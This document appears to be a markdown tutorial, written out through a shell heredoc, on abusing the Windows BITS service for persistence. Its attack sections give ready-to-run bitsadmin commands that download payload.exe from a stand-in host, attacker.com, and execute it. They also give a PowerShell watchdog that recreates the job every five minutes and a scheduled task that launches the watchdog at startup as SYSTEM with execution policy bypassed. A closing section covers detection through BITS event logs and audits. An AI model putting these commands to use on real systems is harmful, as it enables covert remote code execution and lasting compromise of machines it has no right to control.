cat > 4-bits_persistence.md << 'EOF'
# Persistence Using BITSAdmin

## 1. Introduction

### Overview of BITS
Background Intelligent Transfer Service (BITS) is a Windows service that transfers files asynchronously between machines. It is used legitimately by Windows Update and other Microsoft services.

### How attackers abuse BITS
Attackers abuse BITS because:
- Jobs survive reboots by default
- Traffic blends with legitimate Windows Update traffic
- BITS jobs run as SYSTEM or current user
- Low detection rate by traditional AV solutions

---

## 2. Understanding BITS and Its Capabilities

BITS works by creating transfer jobs that run in the background. Key features:
- Downloads files via HTTP/HTTPS/SMB
- Resumes automatically after network interruptions
- Can execute commands upon job completion
- Jobs persist in the BITS database across reboots

---

## 3. Creating a Malicious BITS Job

### Step 1: Enumerate existing BITS jobs
```powershell
bitsadmin /list /allusers /verbose
```

### Step 2: Create a BITS download job
```powershell
bitsadmin /create /download MaliciousJob
```

### Step 3: Add the malicious file to download
```powershell
bitsadmin /addfile MaliciousJob http://attacker.com/payload.exe C:\Windows\Temp\payload.exe
```

### Step 4: Configure execution after download
```powershell
bitsadmin /SetNotifyCmdLine MaliciousJob "C:\Windows\Temp\payload.exe" NULL
bitsadmin /SetNotifyFlags MaliciousJob 1
```

### Step 5: Resume the job
```powershell
bitsadmin /resume MaliciousJob
```

### Step 6: Verify job status
```powershell
bitsadmin /info MaliciousJob /verbose
```

---

## 4. Implementing a Persistence Mechanism

### PowerShell Checker Script
```powershell
# bits_checker.ps1
# Monitors and restores BITS job if removed

while ($true) {
    # Check if job exists
    $job = bitsadmin /list /allusers | Select-String "MaliciousJob"
    
    if (-not $job) {
        Write-Output "[*] Job not found, recreating..."
        
        # Recreate the job
        bitsadmin /create /download MaliciousJob
        bitsadmin /addfile MaliciousJob http://attacker.com/payload.exe C:\Windows\Temp\payload.exe
        bitsadmin /SetNotifyCmdLine MaliciousJob "C:\Windows\Temp\payload.exe" NULL
        bitsadmin /SetNotifyFlags MaliciousJob 1
        bitsadmin /resume MaliciousJob
        
        Write-Output "[+] Job recreated successfully"
    } else {
        Write-Output "[+] Job still active"
    }
    
    # Check every 5 minutes
    Start-Sleep -Seconds 300
}
```

### Automate with Scheduled Task
```powershell
# Create scheduled task to run checker script at startup
schtasks /create /tn "BITSChecker" /tr "powershell -ep bypass -File C:\Windows\Temp\bits_checker.ps1" /sc onstart /ru SYSTEM /f
```

---

## 5. Detecting and Preventing Malicious BITS Jobs

### Detection via Windows Event Logs
```powershell
# Check BITS event logs
Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" | 
    Where-Object {$_.Id -in @(3,4,59,60,61)} | 
    Select-Object TimeCreated, Id, Message | 
    Format-List
```

### List all BITS jobs
```powershell
# Using PowerShell
Get-BitsTransfer -AllUsers

# Using bitsadmin
bitsadmin /list /allusers /verbose
```

### Security measures
- Monitor Event ID 3 (job created), 4 (job completed), 59/60/61 (transfers)
- Use Windows Defender Application Control (WDAC)
- Restrict outbound HTTP/HTTPS from unexpected processes
- Enable BITS logging via Group Policy
- Use EDR solutions that monitor BITS activity

---

## 6. Conclusion

### Summary
BITS provides attackers with a stealthy persistence mechanism that:
- Blends with legitimate Windows traffic
- Survives reboots without registry modifications
- Can download and execute payloads covertly

### Best practices for defense
- Regularly audit BITS jobs: `Get-BitsTransfer -AllUsers`
- Monitor Event ID 3 and 59 in BITS operational logs
- Restrict internet access for SYSTEM processes
- Implement application whitelisting
- Use Autoruns (Sysinternals) to detect persistence mechanisms
EOF